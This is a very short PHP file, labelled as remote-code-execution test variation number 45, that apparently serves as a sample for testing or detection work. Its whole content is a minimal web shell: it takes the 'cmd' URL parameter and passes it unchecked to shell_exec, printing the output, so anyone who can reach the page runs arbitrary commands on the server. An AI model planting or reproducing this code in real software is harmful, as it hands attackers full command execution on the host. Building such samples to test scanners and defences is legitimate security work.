<?php
// RCE test variation #45
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>